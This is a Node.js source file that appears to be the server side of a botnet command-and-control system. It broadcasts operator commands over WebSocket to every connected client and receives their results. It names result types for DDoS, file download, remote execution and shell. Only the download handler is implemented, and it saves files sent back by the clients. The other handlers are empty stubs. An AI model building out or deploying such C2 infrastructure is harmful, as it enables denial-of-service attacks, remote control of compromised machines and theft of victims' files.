const http = require('http');
const WebSocket = require('ws');

const { save_file } = require ('./results_handlers')

const port = 3000;
let commandQueue = [];
let clients = [];

const server = http.createServer((req, res) => {
    if (req.method === 'POST' && req.url === '/send-command') {
        let body = '';
        req.on('data', chunk => {
            body += chunk.toString();
        });
        req.on('end', () => {
            const command = JSON.parse(body);
            commandQueue.push(command);
            // Push the command to all connected clients
            clients.forEach(client => {
                if (client.readyState === WebSocket.OPEN) {
                    client.send(JSON.stringify(command));
                }
            });
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ status: 'Command received and pushed to clients' }));
        });
    } else if (req.method === 'GET' && req.url === '/results') {
        let body = '';
        req.on('data', chunk => {
            body += chunk.toString();
        });
        req.on('end', () => {
            const command = JSON.parse(body);
            //TODO devolver el archivo solicitado
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ status: 'Command received and pushed to clients' }));
        });
    } else {
        res.writeHead(404, { 'Content-Type': 'text/plain' });
        res.end('Not Found');
    }
});

const wss = new WebSocket.Server({ server });

wss.on('connection', (ws, req) => {
    const ip = req.connection.remoteAddress;
    console.log('New WebSocket connection from:', ip);


    clients.push(ws);
        ws.on('message', message => {
            const result = JSON.parse(message);
            switch (result.type) {
                case "DDoS":
                    break;
                case "Download":
                    //console.log('Received result from client:', result);
                    save_file(result)
                    break;

                case "Exec":
                    break;

                case "Shell":
                    break;

                default:
                    console.log("Comando no reconocido.")
                    break;
            }
            // Handle client result, e.g., store it in a database
        });

        ws.on('close', () => {
        clients = clients.filter(client => client !== ws);
    });
});

server.listen(port, () => {
    console.log(`Server is listening on port ${port}`);
});
